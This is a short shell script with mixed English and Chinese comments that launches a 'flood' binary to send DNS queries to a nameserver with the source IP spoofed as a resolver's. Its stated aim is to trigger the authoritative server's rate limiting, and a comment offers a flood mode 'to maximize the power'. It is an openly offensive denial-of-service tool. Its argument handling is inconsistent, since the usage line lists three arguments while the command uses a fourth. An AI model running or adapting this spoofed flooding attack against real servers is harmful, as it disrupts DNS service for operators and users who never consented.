# usage ./dns_query.sh [NS IP] [Resolver IP(spoofed as source IP)] domain... (e.g. www google com)
# write the domain name into the binary
echo "初始化工具环境"
# change the sending speed if necessary (-i). Set it to "flood" (replace -i with --flood) to maximize the power.
# fire!
go version
echo "尝试触发权威服务器请求速率限制"
./flood -i $4 -saddr $2 -taddr $1 -q $3
